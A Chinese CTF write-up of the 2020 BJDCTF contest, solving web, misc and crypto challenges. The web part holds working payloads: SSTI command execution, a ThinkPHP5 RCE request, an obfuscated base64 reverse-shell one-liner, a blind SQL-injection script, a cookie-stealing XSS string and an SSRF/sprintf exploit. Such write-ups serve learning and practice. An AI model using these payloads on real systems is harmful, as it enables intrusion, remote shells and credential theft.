---
title: 2020第二届BJDCTF
date: 2020-03-23
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---

# 2020第二届BJDCTF

## WEB

### fakegoogle

源码注释是SSTI

<!-- more -->

payload

```
/qaq?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
/qaq?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}
```

### old_hack

利用的是thinkphp5的RCE漏洞

payload

```
http://a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn/?s=captcha
post data:_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
```

### duangshell

下载.index.php.swp,

```
vim index.php
#按R还原出源码
```

注册小号申请靶机,ifconfig得到靶机的ip,利用bash构造一句话反弹shell,两次base编码后发送payload

payload

```
ec''ho "WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0="|bas''e64 -d|bas''e64 -d|bash
```

### 简单注入

注入脚本

```
import requests
url="http://796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn/"
flag=""
for i in range(1,100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        # password='or ascii(substr(username,%s,1))>%s#'%(str(i),str(mid))
        password = 'or ascii(substr(password,%s,1))>%s#' % (str(i), str(mid))
        payload = {'username':"\\", 'password':password}
        # print(payload)
        r=requests.post(url,data=payload)
        if 'BJD needs to be stronger' in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
        print(chr(int(mid)),end="")
    flag+=chr(int(mid))
    print(" | "+flag)
#结果,登录得到flag
admin
OhyOuFOuNdit
```

### 假猪套天下第一

登录admin提示不是admin,随便输一个test,登录上,抓包发现注释L0g1n.php

访问L0g1n.php.php

```
#提示
Sorry, this site will be available after totally 99 years!
#查看cookies发现有个time
改成9999999999

#提示
Sorry, this site is only optimized for those who comes from localhost
修改X-Forwarded-For:127.0.0.1
#提示
Do u think that I dont know X-Forwarded-For?Too young too simple sometimes naive
#修改Client-IP:127.0.0.1

#提示
Sorry, this site is only optimized for those who come from gem-love.com
#修改Referer:gem-love.com

#提示
Sorry, this site is only optimized for browsers that run on Commodo 64
#修改User-Agent:Commodo 64
#提示
no no no i think it is not the real commmodo 64,what is the real ua for Commdo?
#google commmodo 64有一中计算机叫Commodore 64
#修改User-Agent:Commodore 64

#提示
Sorry, this site is only optimized for those whose email is root@gem-love.com
#google http head email 发现有一个头叫from
#修改From:root@gem-love.com

#提示
Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ￥100/Month
#Via 代理服务器的相关信息
#修改Via:y1ng.vip

#F12查看元素
<!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg==-->
base64解码
flag{ec26fca1-fadf-44bb-a12a-e67c9e958778}
```

### Schrödinger

查看网页源代码有个test.php,过去看一眼是登录框,首页是一个密码爆破,于是让他自己爆破自己

登录框输入`http://127.0.0.1/test.php`,按input,弹窗提示URL Confirmed.查看cookies

`dXNlcg=MTU4NTAxNTkwMw%3D%3D`base64解码得到user=1585015903,用edit cookies插件置空,刷新页面99%了,点check,得到av号,查看评论区按时间排序,查看最近的评论,得到flag

### XSS之光

扫目录发现git泄露,githack恢复得到源代码

```
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
<?php
#利用原生类xss
$a = new Exception('<script>window.open(document.cookie);</script>');
#由于源代码有个echo直接反序列化字符串
$a = '<script>window.open(document.cookie);</script>';
echo urlencode(serialize($a));
```

传过去得到flag

### elementmaster

检查元素发现

```
<p hidden="" id="506F2E">I am the real Element Masterrr!!!!!!</p>
<p hidden="" id="706870">@颖奇L'Amore</p>
```

hex解码得到Po.php

使用bp遍历元素周期表中的元素.php

得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,访问得到flag

### 文件探测

head里面有hint home.php

访问,发现url包含了system.php

使用伪协议

```
/home.php?file=php://filter/convert.base64-encode/resource=system
/home.php?file=php://filter/convert.base64-encode/resource=home
```

得到源代码

```
//system.php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}
?>
```

利用sprintf格式化字符漏洞

payload

```
q1=y&q2=http://127.0.0.1/admin.php?&q3=GET%25s%25
//admin.php?中的?是为了把拼接的.y1ng.txt当成参数废掉
//%25是%的url编码,第一个%s是为了格式化得到detect的值,第二个%是为转移掉%d使其变成%%d,格式化输出结果就是%d
```

得到admin.php的源码,

```
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}
?>
```

exp

```
function aesEn ($key) {
	$method = 'AES-128-CBC';
	$iv = md5('174.0.222.75', true);
	return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));
}

$url = "http://65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn/admin.php?decrypt=";
$cookes = "y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_COOKIE, $cookes);
$cipher = aesEn('y1ng');
$url = $url . urlencode($cipher);
curl_setopt($curl, CURLOPT_URL, $url);
$result = curl_exec($curl);
var_dump($result);
?>
//加密方式知道,所以访问一下admin.php得到你访问的ip
//不穿PHPsessionid,session就为空,所以加密的data等于null,只要加密key就行
```

## MISC

### 最简单MISC

7z打开,解压得到文件sercet

winhex查看,缺少PNG的文件头,补上文件头再修改后缀为png打开得到flag

### A_Beautiful_Picture

winhex打开,图片高改高得到flag

### EasyBaBa

binwalk分析图片

分理出压缩包,压缩包内是视频,打开视频,中间有一串很快的图片

用windows自带的照片视频打开,点编辑,一帧帧的看,有二维码的页面扫码得到下面文字

```
424A447B79316E677A756973687561697D
```

hex转ASCII,调整一下顺序组成一句话,得到flag

### 小姐姐

```
strings xiaojiejie.jpeg|grep BJD
```

## Crypto

### 签到-y1ng

base64解码得到flag

### 老文盲

用百度翻译朗读

BJD{这就是flag},中间是原汉字

### 燕言燕语

```
79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
```

hex转ASCII

得到：`yanzi ZJQ{xilzv_iqssuhoc_suzjg}`

如果是rot13,偏移量应该相同,但是这里不同,所以是维吉尼亚密码

yanzi 是 key，解密一下得到 flag

### 灵能精通

下载得到jpg,改后缀为jpg,打开发现是一些符号,搜索一下得知是圣堂武士密码,是猪圈密码的变形

对应解密得到
`IMKNIGHTSTEMPLAR`
包上flag
`flag{IMKNIGHTSTEMPLAR}`

### cat_flag

猫转二进制

```
01000010
01001010
01000100
01111011
01001101
00100001
01100001
00110000
01111110
01111101
BJD{M!a0~}
```